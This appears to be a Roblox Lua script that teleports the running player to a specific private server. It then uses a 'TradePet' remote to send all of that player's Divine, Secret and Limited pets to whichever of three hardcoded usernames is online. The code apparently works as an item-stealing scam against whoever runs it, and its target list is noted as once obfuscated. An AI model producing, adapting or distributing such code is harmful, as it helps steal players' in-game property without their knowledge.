-- Teleport to private server
local teleportService = game:GetService("TeleportService")
local gameID = 126884695634066
local serverID = "f4e33cfe30133144919b4aa46930132f"

teleportService:TeleportToPlaceInstance(gameID, serverID, game.Players.LocalPlayer)

-- Wait for teleport to complete (optional delay before continuing)
task.wait(4)

-- Target rarities: Divine, Secret, Limited
local targetRarities = { "Divine", "Secret", "Limited" }
local rarityKey = "Rarity"

-- Preferred usernames (decoded)
local preferredUsers = {
    "boneblossom215",
    "beanstalk1251",
    "burningbud709"
}

-- Find first online preferred user
local targetUser = nil
for _, name in ipairs(preferredUsers) do
    if game.Players:FindFirstChild(name) then
        targetUser = name
        print("Found target user:", targetUser)
        break
    end
end

-- Get TradePet remote
local remoteName = "TradePet"
local remote = game.ReplicatedStorage:FindFirstChild(remoteName)

-- Send qualifying pets to the target user
if targetUser and remote then
    local petFolder = game.Players.LocalPlayer:FindFirstChild("Pets")
    if petFolder then
        for _, pet in pairs(petFolder:GetChildren()) do
            local rarity = pet:FindFirstChild(rarityKey)
            if rarity and table.find(targetRarities, rarity.Value) then
                print("Sending pet:", pet.Name, "with rarity:", rarity.Value)
                remote:FireServer(targetUser, pet.Name)
            end
        end
    else
        warn("Pets folder not found in LocalPlayer.")
    end
else
    warn("No target user online or remote event missing.")
end
